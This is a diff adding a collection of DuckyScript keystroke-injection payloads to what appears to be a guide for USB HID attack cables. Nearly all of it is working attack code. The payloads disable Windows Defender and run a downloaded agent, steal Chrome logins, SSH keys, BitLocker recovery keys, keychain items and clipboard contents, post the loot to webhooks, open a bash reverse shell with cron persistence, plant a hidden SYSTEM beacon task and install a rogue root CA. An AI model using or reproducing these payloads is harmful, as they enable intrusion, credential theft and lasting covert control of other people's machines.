@@ -757,6 +757,560 @@ REM [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("powershell -enc
 REM Put the output in your DNS TXT record
 ```
 
+## Payload: Disable Windows Defender & Deploy Agent
+
+```
+REM Title: DefenderKill-and-Deploy
+REM Description: Disables Defender real-time protection, exclusion for temp dir,
+REM              downloads and executes a staged payload. Requires admin context.
+REM Target: Windows 10/11
+REM Requires: Admin session (UAC prompt via CTRL-SHIFT ENTER)
+
+DEFINE #LHOST 10.10.14.5
+DEFINE #PAYLOAD http://10.10.14.5/agent.exe
+
+ATTACKMODE HID
+
+EXTENSION DETECT_READY
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+REM Open admin PowerShell
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Disable Defender real-time monitoring and add exclusion
+STRING Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true
+ENTER
+DELAY 500
+STRING Add-MpExclusion -Path "$env:TEMP"
+ENTER
+DELAY 500
+
+REM Download and execute payload from exclusion path
+STRING Invoke-WebRequest -Uri '#PAYLOAD' -OutFile "$env:TEMP\svchost.exe"; Start-Process "$env:TEMP\svchost.exe"
+ENTER
+DELAY 2000
+STRINGLN exit
+
+REM Alternative: use certutil (LOLBin) to avoid IWR detection
+REM STRING certutil -urlcache -f #PAYLOAD "$env:TEMP\svchost.exe" & "$env:TEMP\svchost.exe"
+```
+
+## Payload: Chrome Credential & Cookie Extraction
+
+```
+REM Title: ChromeCredTheft
+REM Description: Extracts Chrome saved passwords and cookies, exfils via webhook.
+REM              Uses PowerShell to copy Chrome databases and decrypt with DPAPI.
+REM Target: Windows 10/11 (Chrome / Edge Chromium)
+REM Note: Chrome must be closed for DB copy to succeed
+
+DEFINE #WEBHOOK https://webhook.site/YOUR-ID
+
+ATTACKMODE HID
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+    $_OS = #NOT_WINDOWS
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+IF ($_OS == WINDOWS) THEN
+    GUI r
+    DELAY 500
+    STRINGLN powershell -w h -NoP -NonI -Exec Bypass
+    DELAY 1000
+
+    REM Kill Chrome to release database locks
+    STRING Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue; Start-Sleep -s 1
+    ENTER
+    DELAY 1000
+
+    REM Copy Chrome databases to temp
+    STRING $src="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"; Copy-Item "$src\Login Data" "$env:TEMP\LD.db" -Force; Copy-Item "$src\Cookies" "$env:TEMP\CK.db" -Force; Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" "$env:TEMP\LS.json" -Force
+    ENTER
+    DELAY 2000
+
+    REM Read the encrypted key from Local State and extract saved logins
+    STRING $ls=Get-Content "$env:TEMP\LS.json"|ConvertFrom-Json; $encKey=[Convert]::FromBase64String($ls.os_crypt.encrypted_key); $key=[Security.Cryptography.ProtectedData]::Unprotect($encKey[5..$encKey.Length],$null,'CurrentUser')
+    ENTER
+    DELAY 500
+
+    REM Extract URL + username pairs (password decryption requires more complex DPAPI)
+    STRING Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.dll'; $cn=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\LD.db"); $cn.Open(); $cm=$cn.CreateCommand(); $cm.CommandText='SELECT origin_url,username_value FROM logins WHERE username_value != ""'; $r=$cm.ExecuteReader(); $out=''; while($r.Read()){$out+=$r[0]+' | '+$r[1]+"`n"}; $cn.Close()
+    ENTER
+    DELAY 1000
+
+    REM Exfil via webhook
+    STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content="Chrome Logins:`n$out"}|ConvertTo-Json) -ContentType 'application/json'
+    ENTER
+    DELAY 2000
+
+    REM Cleanup
+    STRING Remove-Item "$env:TEMP\LD.db","$env:TEMP\CK.db","$env:TEMP\LS.json" -Force; exit
+    ENTER
+END_IF
+```
+
+## Payload: Scheduled Task Persistence
+
+```
+REM Title: SchedTaskPersistence
+REM Description: Creates a scheduled task that runs a beacon every 15 minutes.
+REM              Task runs as SYSTEM if admin, or as current user.
+REM              Payload is a PowerShell download cradle hidden in a scheduled task.
+REM Target: Windows 10/11
+
+DEFINE #LHOST 10.10.14.5
+DEFINE #LPORT 443
+DEFINE #TASK_NAME "Microsoft\Windows\Maintenance\SystemHealthCheck"
+
+ATTACKMODE HID
+
+EXTENSION DETECT_READY
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Create scheduled task with convincing name in a system subfolder
+STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -NoP -NonI -Exec Bypass -c `"IEX(IWR http://#LHOST:#LPORT/beacon -UseBasicParsing)`""; $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 15) -Once -At (Get-Date); $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName "#TASK_NAME" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "SYSTEM" -Force
+ENTER
+DELAY 3000
+STRINGLN exit
+
+REM Cleanup check from attacker:
+REM schtasks /query /tn "Microsoft\Windows\Maintenance\SystemHealthCheck" /v
+REM schtasks /delete /tn "Microsoft\Windows\Maintenance\SystemHealthCheck" /f
+```
+
+## Payload: SSH Key Exfiltration
+
+```
+REM Title: SSHKeyExfil
+REM Description: Finds and exfiltrates SSH private keys and config from the target.
+REM              Works on Windows (OpenSSH) and macOS/Linux.
+REM Target: Cross-platform
+
+DEFINE #WEBHOOK https://webhook.site/YOUR-ID
+
+ATTACKMODE HID
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+    $_OS = #NOT_WINDOWS
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+IF ($_OS == WINDOWS) THEN
+    GUI r
+    DELAY 500
+    STRINGLN powershell -w h -NoP -NonI -Exec Bypass
+    DELAY 1000
+    REM Collect SSH keys and config
+    STRING $sshDir = "$env:USERPROFILE\.ssh"; $data = "=== SSH Keys ===`n"; if(Test-Path $sshDir){ Get-ChildItem $sshDir -File | ForEach-Object { $data += "`n--- $($_.Name) ---`n" + (Get-Content $_.FullName -Raw) + "`n" }}; $data += "`n=== Known Hosts ===`n"; if(Test-Path "$sshDir\known_hosts"){ $data += Get-Content "$sshDir\known_hosts" -Raw }
+    ENTER
+    DELAY 1000
+    STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content=$data.Substring(0,[Math]::Min($data.Length,1900))}|ConvertTo-Json) -ContentType 'application/json'
+    ENTER
+    DELAY 2000
+    STRINGLN exit
+ELSE
+    REM macOS / Linux
+    DELAY 2000
+    INJECT_MOD COMMAND
+    DELAY 500
+    STRINGLN terminal
+    DELAY 1000
+    STRINGLN tar czf /tmp/.sshbak.tgz ~/.ssh 2>/dev/null && curl -X POST -F "file=@/tmp/.sshbak.tgz" #WEBHOOK && rm /tmp/.sshbak.tgz
+    DELAY 3000
+    STRINGLN exit
+END_IF
+```
+
+## Payload: Active Directory Enumeration
+
+```
+REM Title: ADQuickEnum
+REM Description: Runs AD enumeration (domain, users, groups, DCs, trusts)
+REM              and exfiltrates results. No tools required — uses built-in commands.
+REM Target: Windows 10/11 (domain-joined)
+
+DEFINE #WEBHOOK https://webhook.site/YOUR-ID
+
+ATTACKMODE HID
+
+EXTENSION DETECT_READY
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP -NonI -Exec Bypass
+DELAY 1000
+
+REM Gather AD info using built-in cmdlets (no BloodHound/PowerView needed)
+STRING $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $info = "Domain: $($d.Name)`nDCs: $($d.DomainControllers.Name -join ', ')`nForest: $($d.Forest.Name)`n"
+ENTER
+DELAY 500
+
+REM Enumerate domain admins
+STRING $info += "`n=== Domain Admins ===`n"; $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]""); $searcher.Filter = "(&(objectCategory=group)(cn=Domain Admins))"; $da = $searcher.FindOne(); $da.Properties.member | ForEach-Object { $info += "$_`n" }
+ENTER
+DELAY 1000
+
+REM Enumerate computers
+STRING $searcher.Filter = "(objectCategory=computer)"; $comps = $searcher.FindAll(); $info += "`n=== Computers ($($comps.Count) total) ===`n"; $comps | Select-Object -First 50 | ForEach-Object { $info += "$($_.Properties.cn)`n" }
+ENTER
+DELAY 1000
+
+REM Enumerate users
+STRING $searcher.Filter = "(&(objectCategory=user)(objectClass=user))"; $users = $searcher.FindAll(); $info += "`n=== Users ($($users.Count) total) ===`n"; $users | Select-Object -First 50 | ForEach-Object { $info += "$($_.Properties.samaccountname) | $($_.Properties.mail)`n" }
+ENTER
+DELAY 1000
+
+REM Exfil
+STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content=$info.Substring(0,[Math]::Min($info.Length,1900))}|ConvertTo-Json) -ContentType 'application/json'
+ENTER
+DELAY 2000
+STRINGLN exit
+```
+
+## Payload: macOS Keychain & System Recon
+
+```
+REM Title: macOS-Recon-Keychain
+REM Description: Runs system enumeration on macOS, attempts to dump keychain items,
+REM              and exfiltrates results. Uses osascript for stealth.
+REM Target: macOS
+
+DEFINE #WEBHOOK https://webhook.site/YOUR-ID
+
+ATTACKMODE HID
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+    $_OS = #NOT_WINDOWS
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+IF ($_OS != WINDOWS) THEN
+    REM macOS — open Terminal via Spotlight
+    DELAY 2000
+    INJECT_MOD COMMAND
+    DELAY 500
+    STRING terminal
+    DELAY 200
+    ENTER
+    DELAY 1500
+
+    REM Gather system info
+    STRINGLN info=$(sw_vers && echo "---" && whoami && echo "---" && id && echo "---" && ifconfig | grep "inet " && echo "---" && networksetup -listallhardwareports && echo "---" && ls /Applications/ && echo "---" && security dump-keychain -d 2>/dev/null | head -200); curl -s -X POST -d "$info" #WEBHOOK; exit
+END_IF
+
+REM Note: security dump-keychain -d will prompt the user for keychain password
+REM For stealth, omit the -d flag (dumps metadata without passwords)
+REM Or use: security find-generic-password -ga "Chrome" 2>&1 | grep password
+REM   (prompts for keychain unlock — may alert the user)
+```
+
+## Payload: Linux Reverse Shell with Persistence
+
+```
+REM Title: LinuxReverseShellPersist
+REM Description: Deploys a reverse shell on Linux with cron-based persistence.
+REM              Uses bash built-ins and cron — no external tools needed.
+REM Target: Linux (Ubuntu, Debian, Fedora, etc.)
+
+DEFINE #LHOST 10.10.14.5
+DEFINE #LPORT 4444
+
+ATTACKMODE HID
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+    $_OS = #NOT_WINDOWS
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+IF ($_OS != WINDOWS) THEN
+    REM Open terminal (Ctrl+Alt+T on most Linux DEs)
+    CTRL-ALT t
+    DELAY 1500
+
+    REM Create hidden beacon script
+    STRINGLN echo '#!/bin/bash' > ~/.config/.updater && echo 'while true; do bash -i >& /dev/tcp/#LHOST/#LPORT 0>&1 2>/dev/null; sleep 300; done' >> ~/.config/.updater && chmod +x ~/.config/.updater
+
+    REM Add cron persistence (reconnects every 5 minutes)
+    DELAY 500
+    STRINGLN (crontab -l 2>/dev/null; echo "*/5 * * * * ~/.config/.updater") | crontab -
+
+    REM Execute immediately
+    DELAY 500
+    STRINGLN nohup ~/.config/.updater &>/dev/null & disown; exit
+END_IF
+```
+
+## Payload: Network Enumeration & Port Scan
+
+```
+REM Title: NetworkRecon
+REM Description: Enumerates local network (ARP table, routes, listening ports,
+REM              DNS servers, nearby hosts) and exfiltrates. No admin required.
+REM Target: Windows 10/11
+
+DEFINE #WEBHOOK https://webhook.site/YOUR-ID
+
+ATTACKMODE HID
+
+EXTENSION DETECT_READY
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP -NonI -Exec Bypass
+DELAY 1000
+
+REM Network enumeration
+STRING $r = "=== IP Config ===`n" + (ipconfig /all | Out-String) + "`n=== ARP Table ===`n" + (arp -a | Out-String) + "`n=== Routes ===`n" + (route print | Select-String "0.0.0.0" | Out-String) + "`n=== Listening Ports ===`n" + (netstat -ano | Select-String "LISTENING" | Out-String) + "`n=== DNS Cache ===`n" + (Get-DnsClientCache | Select-Object Entry,Data | Out-String)
+ENTER
+DELAY 3000
+
+REM Quick subnet ping sweep (top 20 hosts)
+STRING $subnet = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch "Loopback"}).IPAddress -replace '\.\d+$','.'; $alive = ""; 1..254 | ForEach-Object -Parallel { if(Test-Connection "$using:subnet$_" -Count 1 -Quiet -TimeoutSeconds 1){ "$using:subnet$_" }} -ThrottleLimit 50 | ForEach-Object { $alive += "$_`n" }; $r += "`n=== Alive Hosts ===`n$alive"
+ENTER
+DELAY 10000
+
+REM Exfil (truncate to webhook limits)
+STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content=$r.Substring(0,[Math]::Min($r.Length,1900))}|ConvertTo-Json) -ContentType 'application/json'
+ENTER
+DELAY 2000
+STRINGLN exit
+```
+
+## Payload: BitLocker Key Extraction
+
+```
+REM Title: BitLockerKeyExfil
+REM Description: Extracts BitLocker recovery keys from the local system.
+REM              On domain-joined machines, keys are often backed up to AD.
+REM              Requires admin.
+REM Target: Windows 10/11
+
+DEFINE #WEBHOOK https://webhook.site/YOUR-ID
+
+ATTACKMODE HID
+
+EXTENSION DETECT_READY
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Extract BitLocker recovery keys for all volumes
+STRING $keys = "=== BitLocker Keys ===`n"; Get-BitLockerVolume | ForEach-Object { $vol = $_.MountPoint; $_.KeyProtector | Where-Object {$_.RecoveryPassword} | ForEach-Object { $keys += "Volume: $vol | ID: $($_.KeyProtectorId) | Key: $($_.RecoveryPassword)`n" }}; $keys += "`n=== TPM Info ===`n" + (Get-Tpm | Out-String)
+ENTER
+DELAY 2000
+
+STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content=$keys}|ConvertTo-Json) -ContentType 'application/json'
+ENTER
+DELAY 2000
+STRINGLN exit
+
+REM Value: BitLocker recovery keys allow decryption of stolen hard drives
+REM        or recovery of data from seized machines during physical engagements
+```
+
+## Payload: Rogue CA Certificate Installation
+
+```
+REM Title: RogueCA-Install
+REM Description: Downloads and installs a rogue CA certificate into the Windows
+REM              trusted root store. Enables MITM of all HTTPS traffic.
+REM              Requires admin.
+REM Target: Windows 10/11
+REM Setup: Host your mitmproxy/Burp CA cert at the URL below
+
+DEFINE #CERT_URL http://10.10.14.5/ca.cer
+
+ATTACKMODE HID
+
+EXTENSION DETECT_READY
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Download CA cert and install to trusted root store
+STRING Invoke-WebRequest '#CERT_URL' -OutFile "$env:TEMP\update.cer"; Import-Certificate -FilePath "$env:TEMP\update.cer" -CertStoreLocation Cert:\LocalMachine\Root; Remove-Item "$env:TEMP\update.cer" -Force
+ENTER
+DELAY 2000
+STRINGLN exit
+
+REM After installation:
+REM - All HTTPS traffic can be intercepted by mitmproxy/Burp with matching CA
+REM - Browser will not show certificate warnings
+REM - Combine with rogue DHCP/DNS to redirect traffic through proxy
+REM
+REM Cleanup: certutil -delstore Root "THUMBPRINT_OF_ROGUE_CERT"
+```
+
+## Payload: Clipboard Monitor & Exfil
+
+```
+REM Title: ClipboardSpy
+REM Description: Monitors clipboard for passwords, tokens, and sensitive data.
+REM              Runs in background for 5 minutes, collecting clipboard contents,
+REM              then exfiltrates and cleans up.
+REM Target: Windows 10/11
+
+DEFINE #WEBHOOK https://webhook.site/YOUR-ID
+DEFINE #DURATION 300
+
+ATTACKMODE HID
+
+EXTENSION DETECT_READY
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP -NonI -Exec Bypass
+DELAY 1000
+
+REM Background clipboard monitor
+STRING Start-Job -ScriptBlock { $log = ""; $last = ""; $end = (Get-Date).AddSeconds(#DURATION); while((Get-Date) -lt $end){ $clip = Get-Clipboard -ErrorAction SilentlyContinue; if($clip -and $clip -ne $last){ $log += "[$(Get-Date -f 'HH:mm:ss')] $clip`n"; $last = $clip }; Start-Sleep -s 2 }; Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content="Clipboard:`n$($log.Substring(0,[Math]::Min($log.Length,1900)))"}|ConvertTo-Json) -ContentType 'application/json' }
+ENTER
+DELAY 500
+STRINGLN exit
+
+REM The job runs in background for DURATION seconds
+REM Every 2 seconds, checks if clipboard changed
+REM After DURATION, posts all captured clipboard contents to webhook
+REM Captures: copied passwords, tokens, URLs, code snippets, etc.
+```
+
 ## O.MG Elite — Advanced Features
 
 The Elite model (vs Basic) has an extended-range Wi-Fi antenna (100m+), a more capable processor, and firmware features that turn the cable into a persistent remote access implant rather than a one-shot keystroke injector.
